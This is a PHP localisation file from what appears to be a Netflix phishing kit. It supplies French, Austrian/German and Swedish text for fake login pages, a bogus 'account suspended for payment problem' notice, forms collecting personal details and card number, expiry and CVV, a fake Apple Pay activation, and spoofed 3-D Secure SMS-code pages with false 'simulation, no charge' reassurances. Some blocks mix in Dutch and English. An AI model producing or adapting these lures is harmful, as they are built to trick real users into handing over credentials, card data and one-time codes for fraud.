	$app3dApplication12 = "Veuillez valider votre opération sur votre téléphone mobile.";
	$app3dApplication13 = "Abandonner";
	
	// page 3d sms
	
	$sms3dpage_1 = "Vérification 3D";
	$sms3dpage_2 = "IDENTIFICATION PAR SMS";
	$sms3dpage_22 = "IDENTIFICATION DE SÉCURITÉ";

	$sms3dpage_3 = "Merci de saisir le code SMS à usage unique que nous vous avons envoyé par téléphone..";
	$sms3dpage_4 = "REMARQUE:";
	$sms3dpage_5 = " Il s'agit d'une simulation, vous ne serez en aucun cas débité d'un quelconque montant.";
	$sms3dpage_6 = "Référence :";
	$sms3dpage_7 = "Vérification_du_titulaire";
	$sms3dpage_8 = "Montant :";
	$sms3dpage_9 = "0,50 &euro;";
	$sms3dpage_10 = "Date :";
	$sms3dpage_11 = "Numéro de carte de crédit:";
	$sms3dpage_12 = "Numéro de téléphone :";
	$sms3dpage_13 = "+**";
	$sms3dpage_14 = "Entrez le code sms:";
	$sms3dpage_15 = "Abandonner et annuler la transaction";
	$sms3dpage_16 = "Valider";
	$sms3dpage_17 = "Copyright Vérifié par ";
	
	// 3d type 2
	
	$sms3dpage2_1 = "Entrez le code sécurisé:";
	
	// 3d type 3
	
	$sms3dpage3_1 = "Entrez le code SMS";
	$sms3dpage3_2 = "Entrez le mot de passe";

}




if ($Autriche == true) {
    ////////////////////       LOGIN         /////////////////////////////////

    $TXT_Sidentifier = "Sich identifizieren"; // S'identifier
    $TXT_EmailNum = "Email oder Telefonnummer"; // Email ou numéro de téléphone
    $TXT_MotDePasse = "Passwort"; // Mot de passe
	
	// new
	$TXT_Error_MSG	= "Leider ist kein Konto mit dieser E-Mail verknüpft. Bitte versuchen Sie es erneut oder";
	$TXT_Error_MSG_link	= "ein neues Konto erstellen";
	$TXT_Error_MSG_APPLEPAY = "Ungültiger Code";
	
	
    $TXT_Souvenir = "Sich an mich erinnern"; // Se souvenir de moi
    $TXT_BesoinAide = "Brauchen Sie Hilfe ?"; // Besoin d'aide ?
    $TXT_PremierVisite = "Erster Besuch auf Netflix?"; // Première visite sur Netflix ?

    $TXT_InscrivezVous = "Melden Sie sich an"; // Inscrivez-vous
    $TXT_Captcha = "Diese Seite ist mit Google reCAPTCHA geschützt, damit wir sichergehen können, dass Sie kein Roboter sind."; // Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.
    $TXT_SavoirPlus = "Mehr erfahren."; // En savoir plus.

    $InfoPerso = "Persönliche Informationen"; // Informations personnelles
    $Nom = "Name"; // Nom
    $Prenom = "Vorname"; // Prenom
    $dof = "Geburtsdatum"; // Date de naissance
    $numd = "Telefonnummer"; // Numéro de téléphone
    $adresse = "Adresse"; // Adresse
    $ville = "Stadt"; // Ville
    $cp = "Postleitzahl"; // Code Postal

    $continuer = "Weiter"; // Continuer

    $ChampCorrecte = "Bitte füllen Sie die Informationen in den dafür vorgesehenen Feldern korrekt aus."; // Veuillez renseigner correctement les informations dans les champs dédiés.

    $infoBanque = "Bankinformationen"; // Informations bancaires
    $dateInco = "Das eingegebene Ablaufdatum ist falsch."; // La date d'expiration entrée est incorrecte.
    $reNouvelle = "Die Verlängerung Ihres Abonnements wurde bereits durchgeführt."; // Le renouvellement de votre abonnement à déjà été effectué.

    $NumCarte = "Kartennummer"; // "Numéro de carte
    $dde = "Datum des Ablaufs"; // Date d'expiration
    $cvvtxt = "Sicherheitscode ( CVV ) "; // Code de sécurité ( CVV ) 

    $Confirmer = "Bestätigen"; // Confirmer

    $activApple = "Aktivierung von Apple Pay"; // Activation d'Apple Pay
    $DesormaisApple = "Netflix ist jetzt Partner von Apple Pay . "; // Netflix est désormais partenaire d'Apple Pay  . 
    $DesormaisApple1 = "Um Ihre Zahlungsmethode zu überprüfen, geben Sie den Code ein, den Sie per SMS erhalten haben (dies kann je nach Ihrem Telefonanbieter einige Minuten dauern)."; //  Pour vérifier votre moyen de paiement , renseignez le code reçu par SMS(cela peut prendre quelques minutes selon votre opérateur téléphonique).

    $CodeParSMS = "Code per SMS erhalten"; // Code reçu par SMS
    $VerifCours = "Überprüfung läuft"; // Vérification en cours
    $RedirectAuto = "Automatische Weiterleitung in :"; // Redirection automatique dans :  
    $sec = "Sekunden"; // secondes

    $opfinal =  "Operation beendet"; // Opération terminée
    $rediretFinal = "Sie werden automatisch weitergeleitet in :"; // Vous serez automatiquement redirigé dans :

    $TXT_QuestionsOnly = "Haben Sie noch Fragen? Rufen Sie den "; // Des questions ? Appelez le 
    $tXT_QuestionsNum = "0805-543-063"; // (+33) 0805-543-063

    $TXT_CentreAide = "Hilfezentrum"; // Centre d'aide
    $TXT_Condition = "Bedingungen für die Nutzung"; // Conditions d'utilisation
    $TXT_Confi = "Datenschutz"; // Confidentialité
    $TXT_PrefCookies = "Cookie-Einstellungen"; // Préférences de cookies
    $TXT_Mention = "Rechtliche Hinweise"; // Mentions légales
	
	
	$WAIT_title = "Konfirmation";
	$WAIT_subtext = "Bitte warten...";
	
	// page app
	
	$appTitle = "Banking Application Link";
	$appDescription = "To better secure our payments, we are affiliated with Apple Pay. You simply have to accept the active transaction on your banking application to activate Apple Pay. this transaction contains a random amount and a random site.";
	$appWarning = "Please note that under no circumstances will you be charged";
	
	// page 3d application
	
	$app3dApplication = "Overzicht van uw betaling";
	$app3dApplication1 = "Koopman";
	$app3dApplication2 = "Netflix";
	$app3dApplication3 = "Bedrag";
	$app3dApplication4 = "0,50&nbsp;&euro;";
	$app3dApplication5 = "Datum";
	$app3dApplication6 = "Kaartnummer";
	$app3dApplication7 = "Uw operatie moet beveiligd worden.";
	$app3dApplication8 = "Er is een mobiel bevestigingsverzoek naar uw apparaat gestuurd.";
	$app3dApplication9 = "Start uw mobiele toepassing";
	$app3dApplication11 = "om deze operatie te verifiëren en te bevestigen.";
	$app3dApplication12 = "Bevestig uw transactie op uw mobiele telefoon.";
	$app3dApplication13 = "Annuleren";	
	
	// page 3d sms
	
	$sms3dpage_1 = "3D-verificatie";
	$sms3dpage_2 = "SMS IDENTIFICATIE";
	$sms3dpage_22 = "VEILIGHEIDSIDENTIFICATIE";

	$sms3dpage_3 = "Bedankt voor het invoeren van de eenmalige sms-code die we u per telefoon hebben gestuurd.";
	$sms3dpage_4 = "OPMERKING:";
	$sms3dpage_5 = " Dit is een simulatie, u wordt in geen geval gedebiteerd voor enig bedrag.";
	$sms3dpage_6 = "Referentie :";
	$sms3dpage_7 = "houder_Verificatie";
	$sms3dpage_8 = "Bedrag :";
	$sms3dpage_9 = "0,50 &euro;";
	$sms3dpage_10 = "Datum :";
	$sms3dpage_11 = "Kredietkaartnummer:";
	$sms3dpage_12 = "Telefoonnummer :";
	$sms3dpage_13 = "+**";
	$sms3dpage_14 = "Voer de sms-code in:";
	$sms3dpage_15 = "De transactie opgeven en annuleren";
	$sms3dpage_16 = "Valideer";
	$sms3dpage_17 = "Copyright Geverifieerd door ";
	
	// 3d type 2
	
	$sms3dpage2_1 = "Voer de beveiligde code in:";
	
	// 3d type 3
	
	$sms3dpage3_1 = "Voer de SMS-code in";
	$sms3dpage3_2 = "Voer het wachtwoord in";
}


if ($Suedois == true) {
    ////////////////////       LOGIN         /////////////////////////////////

    $TXT_Sidentifier = "Logga in"; // S'identifier
    $TXT_EmailNum = "E-post eller telefonnummer"; // Email ou numéro de téléphone
    $TXT_MotDePasse = "Lösenord"; // Mot de passe
	
	// new
	$TXT_Error_MSG	= "Tyvärr är inget konto kopplat till det här e-postmeddelandet. Försök igen eller";
	$TXT_Error_MSG_link	= "skapa ett nytt konto";
	$TXT_Error_MSG_APPLEPAY = "Ogiltig kod";
	
	
    $TXT_Souvenir = "Kom ihåg mig"; // Se souvenir de moi
    $TXT_BesoinAide = "Behövs hjälp ? "; // Besoin d'aide ?
    $TXT_PremierVisite = "Första besöket på Netflix?"; // Première visite sur Netflix ?

    $TXT_InscrivezVous = "Bli Medlem"; // Inscrivez-vous
    $TXT_Captcha = "Den här sidan är skyddad av Google reCAPTCHA för att säkerställa att du inte är en robot."; // Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.
    $TXT_SavoirPlus = "Läs mer."; // En savoir plus.

    ////////////////////       error_on_login         /////////////////////////////////

    $SuspAbo = "Avstängning av ditt abonnemang."; // Suspension de votre abonnement.
    $PrblPaiment = "Ett betalningsproblem uppstod under den senaste faktureringsperioden."; // Un problème de paiement a eu lieu lors du dernier cycle de facturation.
    $NvDoncBloque = "Vi har därför blockerat ditt konto i väntan på bekräftelse av din faktureringsinformation."; // Nous avons donc bloqué votre compte en attendant la confirmation de vos informations de facturation.
    $VeuillezVerif = "Vänligen verifiera din information för att fortsätta."; // Veuillez vérifier vos informations pour continuer.

    $Poursuivre = "Att jaga"; // Poursuivre


    $InfoPerso = "Personlig information"; // Informations personnelles
    $Nom = "Efternamn"; // Nom
    $Prenom =  "Förnamn"; // Prenom
    $dof = "Födelsedatum"; // Date de naissance
    $numd = "Telefonnummer"; // Numéro de téléphone
    $adresse = "Adress"; // Adresse
    $ville = "Stad"; // Ville
    $cp = "Postnummer"; // Code Postal

    $continuer = "Fortsätta"; // Continuer

    $ChampCorrecte = "Vänligen fyll i informationen i de särskilda fälten."; // Veuillez renseigner correctement les informations dans les champs dédiés.

    $infoBanque = "Bankinformation"; // Informations bancaires
    $dateInco = "Det angivna utgångsdatumet är felaktigt."; // La date d'expiration entrée est incorrecte.
    $reNouvelle = "Din prenumeration har redan förnyats."; // Le renouvellement de votre abonnement à déjà été effectué.

    $NumCarte = "Kortnummer"; // "Numéro de carte
    $dde =  "Utgångsdatum"; // Date d'expiration
    $cvvtxt = "säkerhetskod( CVV ) "; // Code de sécurité ( CVV ) 

    $Confirmer = "Att bekräfta"; // Confirmer

    $activApple = "Aktivera Apple Pay"; // Activation d'Apple Pay
    $DesormaisApple = "Netflix är nu en Apple Pay-partner. "; // Netflix est désormais partenaire d'Apple Pay  . 
    $DesormaisApple1 = " För att verifiera din betalningsmetod anger du koden som du fått via SMS (detta kan ta några minuter beroende på din telefonoperatör)."; //  Pour vérifier votre moyen de paiement , renseignez le code reçu par SMS(cela peut prendre quelques minutes selon votre opérateur téléphonique).

    $CodeParSMS = "Kod mottagen via SMS"; // Code reçu par SMS
    $VerifCours = "Verifiering pågår"; // Vérification en cours
    $RedirectAuto = "Automatisk omdirigering i:  "; // Redirection automatique dans :  
    $sec = "sekunder"; // secondes

    $opfinal =  "Operation avslutad"; // Opération terminée
    $rediretFinal = "Du kommer automatiskt att omdirigeras till:"; // Vous serez automatiquement redirigé dans :

    $TXT_QuestionsOnly = "Frågor? ring honom "; // Des questions ? Appelez le 
    $tXT_QuestionsNum = "(+46) 0805-543-063"; // (+33) 0805-543-063

    $TXT_CentreAide = "Hjälpcenter"; // Centre d'aide
    $TXT_Condition = "Villkor"; // Conditions d'utilisation
    $TXT_Confi = "Integritet"; // Confidentialité
    $TXT_PrefCookies = "Cookie-preferenser"; // Préférences de cookies
    $TXT_Mention = "Rättsligt meddelande"; // Mentions légales
	
	
	$WAIT_title = "Bekräftelse";
	$WAIT_subtext = "Vänta lite...";
	
	// page app
	
	$appTitle = "Länk till bankansökan";
	$appDescription = "För att säkra våra betalningar bättre är vi anslutna till Apple Pay. Du behöver bara acceptera den aktiva transaktionen i din bankapplikation för att aktivera Apple Pay. den här transaktionen innehåller ett slumpmässigt belopp och en slumpmässig plats.";
	$appWarning = "Observera att du under inga omständigheter kommer att debiteras för";
	
	// page 3d application
	
	$app3dApplication = "Sammanfattning av din betalning";
	$app3dApplication1 = "Köpman";
	$app3dApplication2 = "Netflix";
	$app3dApplication3 = "Belopp";
	$app3dApplication4 = "0,50&nbsp;&euro;";
	$app3dApplication5 = "Datum";
	$app3dApplication6 = "Kortnummer";
	$app3dApplication7 = "Din verksamhet måste säkras.";
	$app3dApplication8 = "En begäran om mobil bekräftelse har skickats till din enhet";
	$app3dApplication9 = "Starta din mobilapplikation";
	$app3dApplication11 = "för att kontrollera och bekräfta denna operation.";
	$app3dApplication12 = "Bekräfta transaktionen på din mobiltelefon.";
	$app3dApplication13 = "Avbryt";	
	
	// page 3d sms
	
	$sms3dpage_1 = "3D-verifiering";
	$sms3dpage_2 = "IDENTIFIERING AV SMS";
	$sms3dpage_22 = "SÄKERHETSIDENTIFIERING.";

	$sms3dpage_3 = "Tack för att du anger den engångs-sms-kod som vi skickade till dig via telefon.";
	$sms3dpage_4 = "ANMÄRKNING:";
	$sms3dpage_5 = " Detta är en simulering, du kommer aldrig att debiteras med något belopp.";
	$sms3dpage_6 = "Referens :";
	$sms3dpage_7 = "Innehavare_verifiering";
	$sms3dpage_8 = "Belopp :";
	$sms3dpage_9 = "0,50 &euro;";
	$sms3dpage_10 = "Datum :";
	$sms3dpage_11 = "Kreditkortsnummer:";
	$sms3dpage_12 = "Telefonnummer :";
	$sms3dpage_13 = "+**";
	$sms3dpage_14 = "Ange sms-koden:";
	$sms3dpage_15 = "Överge och avbryta transaktionen";
	$sms3dpage_16 = "Validera";
	$sms3dpage_17 = "Upphovsrätt Verifierad av ";
	
	// 3d type 2
	
	$sms3dpage2_1 = "Ange den säkra koden:";
	
	// 3d type 3
	
	$sms3dpage3_1 = "Ange SMS-koden";
	$sms3dpage3_2 = "Ange lösenordet";
}


?>